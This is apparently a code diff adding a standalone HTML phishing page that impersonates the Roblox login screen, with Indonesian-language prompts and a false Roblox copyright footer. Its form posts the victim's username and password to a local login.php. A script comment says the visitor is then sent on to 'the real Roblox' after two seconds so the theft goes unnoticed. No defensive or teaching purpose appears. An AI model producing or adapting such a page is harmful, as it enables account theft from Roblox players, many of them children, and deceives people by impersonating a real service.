@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Roblox</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: #0b0b1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: #1a1a2e;
+            padding: 40px;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+            border: 1px solid #2a2a4a;
+        }
+        .logo {
+            text-align: center;
+            font-size: 40px;
+            font-weight: 900;
+            color: #ffffff;
+            margin-bottom: 30px;
+            letter-spacing: 2px;
+        }
+        .logo span {
+            color: #2d8cff;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            color: #b0b0c0;
+            font-size: 14px;
+            font-weight: 500;
+            display: block;
+            margin-bottom: 6px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #0d0d1f;
+            border: 2px solid #2a2a4a;
+            border-radius: 10px;
+            color: #ffffff;
+            font-size: 15px;
+            outline: none;
+            transition: 0.3s;
+        }
+        .form-group input:focus {
+            border-color: #2d8cff;
+            box-shadow: 0 0 20px rgba(45, 140, 255, 0.1);
+        }
+        .form-group input::placeholder {
+            color: #4a4a6a;
+        }
+        .btn {
+            background: linear-gradient(135deg, #2d8cff, #1a6fd8);
+            color: white;
+            padding: 16px;
+            border: none;
+            border-radius: 10px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(45, 140, 255, 0.3);
+        }
+        .footer {
+            text-align: center;
+            color: #3a3a5a;
+            font-size: 12px;
+            margin-top: 20px;
+        }
+        .error {
+            color: #ff4757;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">ROBLOX</div>
+        <form action="login.php" method="POST" id="loginForm">
+            <div class="form-group">
+                <label>Username / Email</label>
+                <input type="text" name="username" placeholder="Masukkan username atau email" required>
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" name="password" placeholder="Masukkan password" required>
+            </div>
+            <button type="submit" class="btn" id="submitBtn">Log In</button>
+            <div class="error" id="errorMsg">Username atau password salah. Coba lagi.</div>
+        </form>
+        <div class="footer">© 2024 Roblox Corporation</div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const btn = document.getElementById('submitBtn');
+            btn.textContent = '⏳ Memproses...';
+            btn.style.opacity = '0.6';
+            
+            // Redirect ke Roblox asli setelah 2 detik
+            setTimeout(() => {
+                window.location.href = 'https://www.roblox.com/login';
+            }, 2000);
+        });
+    </script>
+</body>
+  </html>
